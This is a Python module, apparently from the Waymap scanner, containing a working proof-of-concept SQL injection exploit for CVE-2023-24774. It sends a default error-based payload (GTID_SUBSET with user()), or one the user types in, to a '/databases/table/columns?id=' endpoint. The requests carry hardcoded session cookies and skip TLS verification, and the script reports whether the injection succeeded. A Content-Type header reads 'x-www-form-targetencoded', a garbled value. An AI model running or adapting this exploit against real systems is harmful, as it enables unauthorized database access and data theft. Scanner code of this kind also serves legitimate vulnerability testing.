# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2023-24774

import requests
import uuid
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_csrf_token():
    csrf_token = uuid.uuid4()
    return str(csrf_token).replace('-', '')

def common_headers(target):
    csrf_token = generate_csrf_token()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*",
        "Accept-Language": "zh-CN,zh",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRF-TOKEN": csrf_token,
        "Host": target,
        "Content-Type": "application/x-www-form-targetencoded",
        "charset": "UTF-8",
        "Accept-Encoding": "gzip"
    }
    return headers

def scan_cve_2023_24774(target):
    headers = common_headers(target)
    target = f"{target}/databases/table/columns?id='"

    cookies = {
        'Hm_lvt_ce074243117e698438c49cd037b593eb': '1673498041',
        'ci_session': 'ca40t5m9pvlvp7gftr11qng0g0lofceq',
        'PHPSESSID': '591a908579ac738f0fc0f53d05c6aa51',
    }

    sqli = input("Input SQLi: ")
    if not sqli:
        sqli = "+AND+GTID_SUBSET(CONCAT(0x12,(SELECT+(ELT(6415=6415,1))),user()),6415)--+qRTY"
    else:
        sqli = sqli.replace(' ', '+')

    target += f"{sqli}--+qRTY"
    print(f"Request target: {target}")

    sqli_request = requests.get(target, cookies=cookies, headers=headers, verify=False)
    print(sqli_request.text)

    if 'message' in sqli_request.text:
        print('**POC CVE-2023-24774: SQLi works** :)')
    else:
        print('**POC CVE-2023-24774: SQLi does not work** :(')
